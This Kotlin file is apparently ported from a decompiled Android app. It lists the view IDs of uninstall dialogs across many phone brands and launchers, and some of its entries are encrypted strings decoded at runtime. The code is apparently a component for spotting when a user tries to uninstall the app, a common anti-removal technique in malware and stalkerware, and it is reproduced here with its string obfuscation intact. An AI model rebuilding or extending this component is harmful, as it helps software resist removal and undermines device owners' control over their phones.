package com.storm.safe.rock.p000

import com.storm.safe.rock.util.StringUtil

/**
 * JADX: p000/gb1.java (51 LOC)
 *
 * Static keyword lists for uninstall dialog detection, organized by brand.
 * Contains ViewId strings for brand-specific launcher uninstall dialogs.
 *
 * Renamed: gb1 → UninstallDialogKeywords
 * Fields renamed: f56435a0 → genericDialogIds, f56436a1 → xiaomiDialogIds, etc.
 *
 * Note: Some entries reference encrypted strings from eb1 (JADX),
 * which are decoded at runtime via StringUtil.decrypt().
 */
object UninstallDialogKeywords {

    // ==================== eb1 encrypted strings (JADX) ====================
    // ADAPT: eb1 fields are runtime-decrypted. We replicate the decrypt() calls.
    // The actual values are brand-specific ViewId strings.

    /** eb1.f55951a0 */
    private val eb1_a0: String = StringUtil.decrypt("JMn5cpo6FnbmKDnMHi5J")
    /** eb1.f55952a1 */
    private val eb1_a1: String = StringUtil.decrypt("PsrqcpI2Fnbqayns")
    /** eb1.f55953a2 */
    private val eb1_a2: String = StringUtil.decrypt("6h0U+Lg3FvbkIHjM")
    /** eb1.f55954a3 */
    private val eb1_a3: String = StringUtil.decrypt("aUJvYUM/Jnb2b2n2")
    /** eb1.f55955a4 */
    private val eb1_a4: String = StringUtil.decrypt("YgPl4lwUgHdJCZAi")
    /** eb1.f55956a5 */
    private val eb1_a5: String = StringUtil.decrypt("AUhmcXEr/DlSJyJWHwVM")
    /** eb1.f55957a6 — Huawei common prefix */
    private val eb1_a6: String = StringUtil.decrypt("MnLp/p8fTCLtdGj8")
    /** eb1.f55958a7 — Huawei common prefix */
    private val eb1_a7: String = StringUtil.decrypt("6OFM5igeTC7jO2n4")
    /** eb1.f55959a8 — Huawei common prefix */
    private val eb1_a8: String = StringUtil.decrypt("VQVnKuoUoNFdD7i4")
    /** eb1.f55960a9 — Samsung prefix */
    private val eb1_a9: String = StringUtil.decrypt("qEtT+eY9qhmmQVi6")
    /** eb1.f55961b0 — Samsung prefix */
    private val eb1_b0: String = StringUtil.decrypt("xWAB9sU3E4fNKkq2")
    /** eb1.f55962b1 — Samsung prefix */
    private val eb1_b1: String = StringUtil.decrypt("ZxadruzcP2hvHNou")
    /** eb1.f55963b2 — vivo prefix */
    private val eb1_b2: String = StringUtil.decrypt("IvZZSA2GQWwXkhFX")
    /** eb1.f55964b3 — vivo prefix */
    private val eb1_b3: String = StringUtil.decrypt("a3KBsCws40hieta0")
    /** eb1.f55965b4 — vivo prefix */
    private val eb1_b4: String = StringUtil.decrypt("6uGS0ky4rMnmkLi4")
    /** eb1.f55966b5 — Google prefix */
    private val eb1_b5: String = StringUtil.decrypt("lIT9/ZCUOxePiRsr")
    /** eb1.f55967b6 — Google prefix */
    private val eb1_b6: String = StringUtil.decrypt("8F4wQ4IXzy/4ClsG")
    /** eb1.f55968b7 — Google prefix */
    private val eb1_b7: String = StringUtil.decrypt("8yNOPmkBz+wL3fG5")

    // ==================== f56435a0 — 通用对话框 ViewId ====================
    val genericDialogIds: List<String> = listOf(
        "com.android.launcher:id/btn_positive",
        "com.android.launcher:id/btn_negative",
        "com.android.launcher3:id/alertTitle",
        "com.oppo.launcher:id/btn_positive",
        "com.oppo.launcher:id/btn_negative",
        "com.bbk.launcher2:id/uninstall_title",
        "android:id/alertTitle",
        "android:id/button1",
        "android:id/button2"
    )

    // ==================== f56436a1 — 小米 Xiaomi ====================
    val xiaomiDialogIds: List<String> = listOf(
        "com.miui.home:id/title",
        "com.miui.securitycenter:id/cta_positive",
        "miui:id/button2",
        "miui:id/action_positive",
        "com.xiaomi.market:id/alertTitle",
        "com.miui.securitycenter:id/action_bar_title",
        "com.miui.securitycenter:id/app_manager_details_applabel",
        eb1_a0, eb1_a1, eb1_a2,
        "com.miui.home:id/btn_positive",
        "com.miui.home:id/btn_negative",
        "com.miui.home:id/alertTitle",
        "com.miui.home:id/message",
        "com.miui.home:id/dialog_title",
        "com.miui.home:id/dialog_content",
        "com.miui.home:id/content",
        "com.miui.home:id/title"
    )

    // ==================== f56437a2 — OPPO/ColorOS ====================
    val oppoDialogIds: List<String> = listOf(
        "com.oppo.launcher:id/btn_positive",
        "com.oppo.launcher:id/btn_negative",
        "com.coloros.phonemanager:id/btn_confirm",
        "com.coloros.phonemanager:id/agree_bottom_button",
        "com.oplus.phonemanager:id/btn_confirm",
        eb1_a3, eb1_a4, eb1_a5,
        "com.oppo.launcher:id/alertTitle",
        "com.oppo.launcher:id/message",
        "com.oppo.launcher:id/txt_uninstall_main_title",
        "com.oppo.launcher:id/uninstall_dialog_title",
        "com.oppo.launcher:id/dialog_title",
        "com.oppo.launcher:id/dialog_content",
        "com.oplus.launcher:id/alertTitle",
        "com.oplus.launcher:id/message",
        "com.oplus.launcher:id/txt_uninstall_main_title",
        "com.oplus.launcher:id/btn_positive",
        "com.oplus.launcher:id/btn_negative",
        "com.oplus.launcher:id/dialog_title",
        "com.oplus.launcher:id/dialog_content",
        "com.coloros.launcher:id/alertTitle",
        "com.coloros.launcher:id/message",
        "com.coloros.launcher:id/btn_positive",
        "com.coloros.launcher:id/btn_negative",
        "com.realme.launcher:id/btn_positive",
        "com.realme.launcher:id/btn_negative",
        "com.realme.launcher:id/alertTitle",
        "com.realme.launcher:id/message",
        "com.realme.launcher:id/txt_uninstall_main_title",
        "com.realme.launcher:id/dialog_title",
        "com.realme.launcher:id/dialog_content",
        "com.realme.launcher:id/uninstall_dialog_title",
        "com.oneplus.launcher:id/btn_positive",
        "com.oneplus.launcher:id/btn_negative",
        "com.oneplus.launcher:id/alertTitle",
        "com.oneplus.launcher:id/message",
        "net.oneplus.launcher:id/btn_positive",
        "net.oneplus.launcher:id/btn_negative",
        "net.oneplus.launcher:id/alertTitle",
        "net.oneplus.launcher:id/message",
        "com.android.launcher:id/alertTitle",
        "com.android.launcher:id/message",
        "com.android.launcher:id/txt_uninstall_main_title",
        "com.android.launcher:id/txt_uninstall_sub_title",
        "com.android.launcher:id/alert_panel_content_area",
        "com.android.launcher:id/btn_positive",
        "com.android.launcher:id/btn_negative",
        "com.android.launcher:id/btn_area"
    )

    // ==================== f56438a3 — 华为 Huawei ====================
    val huaweiDialogIds: List<String> = listOf(
        eb1_a6, eb1_a7, eb1_a8,
        "com.huawei.android.launcher:id/btn_positive",
        "com.huawei.android.launcher:id/btn_negative",
        "com.huawei.android.launcher:id/alertTitle",
        "com.huawei.android.launcher:id/message",
        "com.huawei.android.launcher:id/dialog_title",
        "com.huawei.home:id/btn_positive",
        "com.huawei.home:id/btn_negative"
    )

    // ==================== f56439a4 — 荣耀 Honor ====================
    val honorDialogIds: List<String> = listOf(
        eb1_a6, eb1_a7, eb1_a8,
        "com.hihonor.android.launcher:id/delete_item_enhanced",
        "com.hihonor.android.launcher:id/remove_item_enhanced_desc",
        "com.hihonor.android.launcher:id/delete_item",
        "com.hihonor.android.launcher:id/btn_positive",
        "com.hihonor.android.launcher:id/btn_negative",
        "com.hihonor.android.launcher:id/alertTitle",
        "com.hihonor.android.launcher:id/message",
        "com.hihonor.android.launcher:id/dialog_title",
        "com.hihonor.android.launcher:id/dialog_message",
        "com.hihonor.home:id/btn_positive",
        "com.hihonor.home:id/btn_negative",
        "com.hihonor.home:id/delete_item",
        "com.hihonor.home:id/delete_item_enhanced",
        "com.hihonor.home:id/alertTitle",
        "com.hihonor.home:id/message",
        "com.hihonor.home:id/dialog_title",
        "com.hihonor.home:id/dialog_message"
    )

    // ==================== f56440a5 — 三星 Samsung ====================
    val samsungDialogIds: List<String> = listOf(
        eb1_a9, eb1_b0, eb1_b1,
        "com.samsung.android.launcher:id/btn_positive",
        "com.samsung.android.launcher:id/btn_negative",
        "com.samsung.android.launcher:id/alertTitle",
        "com.samsung.android.launcher:id/message",
        "com.samsung.android.launcher:id/dialog_title",
        "com.samsung.android.launcher:id/dialog_content",
        "com.sec.android.app.launcher:id/btn_positive",
        "com.sec.android.app.launcher:id/btn_negative",
        "com.sec.android.app.launcher:id/alertTitle",
        "com.sec.android.app.launcher:id/message",
        "com.sec.android.app.launcher:id/dialog_title",
        "com.sec.android.app.launcher:id/dialog_content"
    )

    // ==================== f56441a6 — Google/AOSP ====================
    val googleDialogIds: List<String> = listOf(
        eb1_b5, eb1_b6, eb1_b7,
        "com.google.android.apps.nexuslauncher:id/alertTitle",
        "com.google.android.apps.nexuslauncher:id/message",
        "com.google.android.apps.nexuslauncher:id/btn_positive",
        "com.google.android.apps.nexuslauncher:id/btn_negative",
        "com.google.android.apps.nexuslauncher:id/dialog_title",
        "com.google.android.apps.nexuslauncher:id/dialog_content",
        "com.android.launcher3:id/alertTitle",
        "com.android.launcher3:id/message",
        "com.android.launcher3:id/btn_positive",
        "com.android.launcher3:id/btn_negative",
        "com.android.launcher3:id/dialog_title",
        "com.android.launcher3:id/dialog_content",
        "com.android.launcher3:id/txt_uninstall_main_title",
        "com.android.launcher3:id/txt_uninstall_sub_title",
        "com.android.launcher2:id/alertTitle",
        "com.android.launcher2:id/message",
        "com.android.launcher2:id/btn_positive",
        "com.android.launcher2:id/btn_negative"
    )

    // ==================== f56442a7 — 魅族 Meizu ====================
    val meizuDialogIds: List<String> = listOf(
        "com.meizu.launcher:id/alertTitle",
        "com.meizu.launcher:id/message",
        "com.meizu.launcher:id/btn_positive",
        "com.meizu.launcher:id/btn_negative",
        "com.meizu.flyme.launcher:id/alertTitle",
        "com.meizu.flyme.launcher:id/message",
        "com.meizu.flyme.launcher:id/btn_positive",
        "com.meizu.flyme.launcher:id/btn_negative",
        "com.meizu.launcher3:id/alertTitle",
        "com.meizu.launcher3:id/message",
        "com.meizu.launcher3:id/btn_positive",
        "com.meizu.launcher3:id/btn_negative"
    )

    // ==================== f56443a8 — 其他品牌 (Motorola, LG, Nothing, ASUS, ZTE, etc.) ====================
    val otherBrandsDialogIds: List<String> = listOf(
        "com.motorola.launcher3:id/alertTitle",
        "com.motorola.launcher3:id/message",
        "com.motorola.launcher3:id/btn_positive",
        "com.motorola.launcher3:id/btn_negative",
        "com.lge.launcher2:id/alertTitle",
        "com.lge.launcher2:id/message",
        "com.lge.launcher3:id/alertTitle",
        "com.lge.launcher3:id/message",
        "com.nothing.launcher:id/alertTitle",
        "com.nothing.launcher:id/message",
        "com.nothing.launcher:id/btn_positive",
        "com.nothing.launcher:id/btn_negative",
        "com.asus.launcher:id/alertTitle",
        "com.asus.launcher:id/message",
        "com.asus.zenui.launcher:id/alertTitle",
        "com.asus.zenui.launcher:id/message",
        "com.zte.mifavor.launcher:id/alertTitle",
        "com.zte.mifavor.launcher:id/message",
        "com.lenovo.launcher:id/alertTitle",
        "com.lenovo.launcher:id/message",
        "com.transsion.launcher:id/alertTitle",
        "com.transsion.launcher:id/message",
        "com.infinix.launcher:id/alertTitle",
        "com.infinix.launcher:id/message",
        "com.tecno.launcher:id/alertTitle",
        "com.tecno.launcher:id/message",
        "com.itel.launcher:id/alertTitle",
        "com.itel.launcher:id/message",
        "cn.nubia.launcher:id/alertTitle",
        "cn.nubia.launcher:id/message",
        "com.smartisanos.launcher:id/alertTitle",
        "com.smartisanos.launcher:id/message",
        "com.sonymobile.home:id/alertTitle",
        "com.sonymobile.home:id/message",
        "com.sony.home:id/alertTitle",
        "com.sony.home:id/message",
        "com.evenwell.launcher:id/alertTitle",
        "com.evenwell.launcher:id/message",
        "com.yulong.android.launcher:id/alertTitle",
        "com.yulong.android.launcher:id/message",
        "com.gionee.launcher:id/alertTitle",
        "com.gionee.launcher:id/message",
        "com.lenovo.launcher2:id/alertTitle",
        "com.lenovo.launcher2:id/message",
        "com.motorola.launcher:id/alertTitle",
        "com.motorola.launcher:id/message",
        "com.nokia.launcher:id/alertTitle",
        "com.nokia.launcher:id/message",
        "com.sonyericsson.home:id/alertTitle",
        "com.sonyericsson.home:id/message",
        "com.blackshark.launcher:id/alertTitle",
        "com.blackshark.launcher:id/message",
        "com.blackshark.launcher:id/btn_positive",
        "com.blackshark.launcher:id/btn_negative",
        "com.action.launcher:id/alertTitle",
        "com.action.launcher:id/message",
        "com.teslacoilsw.launcher:id/alertTitle",
        "com.teslacoilsw.launcher:id/message",
        "com.microsoft.launcher:id/alertTitle",
        "com.microsoft.launcher:id/message",
        "com.niagara.launcher:id/alertTitle",
        "com.niagara.launcher:id/message"
    )

    // ==================== f56444a9 — vivo/iQOO ====================
    val vivoDialogIds: List<String> = listOf(
        "com.bbk.launcher2:id/uninstall_title",
        "com.vivo.permissionmanager:id/text_msg",
        "com.android.systemui:id/VivoPinkey",
        eb1_b2, eb1_b3, eb1_b4,
        "com.bbk.launcher2:id/uninstall_title",
        "com.bbk.launcher2:id/uninstall_app_des",
        "com.bbk.launcher2:id/uninstall_gridview",
        "com.bbk.launcher2:id/alertTitle",
        "com.bbk.launcher2:id/message",
        "com.bbk.launcher2:id/btn_positive",
        "com.bbk.launcher2:id/btn_negative",
        "com.bbk.launcher2:id/dialog_title",
        "com.bbk.launcher2:id/dialog_content",
        "com.bbk.launcher:id/uninstall_title",
        "com.bbk.launcher:id/uninstall_app_des",
        "com.bbk.launcher:id/alertTitle",
        "com.bbk.launcher:id/message",
        "com.bbk.launcher:id/btn_positive",
        "com.bbk.launcher:id/btn_negative",
        "com.bbk.launcher:id/dialog_title",
        "com.bbk.launcher:id/dialog_content",
        "com.vivo.launcher:id/uninstall_title",
        "com.vivo.launcher:id/uninstall_app_des",
        "com.vivo.launcher:id/alertTitle",
        "com.vivo.launcher:id/message",
        "com.vivo.launcher:id/btn_positive",
        "com.vivo.launcher:id/btn_negative",
        "com.vivo.launcher:id/dialog_title",
        "com.vivo.launcher:id/dialog_content",
        "com.vivo.launcher.two:id/uninstall_title",
        "com.vivo.launcher.two:id/uninstall_app_des",
        "com.vivo.launcher.two:id/alertTitle",
        "com.vivo.launcher.two:id/message",
        "com.vivo.launcher.two:id/btn_positive",
        "com.vivo.launcher.two:id/btn_negative",
        "com.vivo.launcher.two:id/dialog_title",
        "com.vivo.launcher.two:id/dialog_content",
        "com.iqoo.launcher:id/uninstall_title",
        "com.iqoo.launcher:id/uninstall_app_des",
        "com.iqoo.launcher:id/alertTitle",
        "com.iqoo.launcher:id/message",
        "com.iqoo.launcher:id/btn_positive",
        "com.iqoo.launcher:id/btn_negative",
        "com.iqoo.launcher:id/dialog_title",
        "com.iqoo.launcher:id/dialog_content",
        "com.iqoo.launcher.two:id/uninstall_title",
        "com.iqoo.launcher.two:id/uninstall_app_des",
        "com.iqoo.launcher.two:id/alertTitle",
        "com.iqoo.launcher.two:id/message",
        "com.iqoo.launcher.two:id/btn_positive",
        "com.iqoo.launcher.two:id/btn_negative",
        "com.iqoo.launcher.two:id/dialog_title",
        "com.iqoo.launcher.two:id/dialog_content"
    )
}
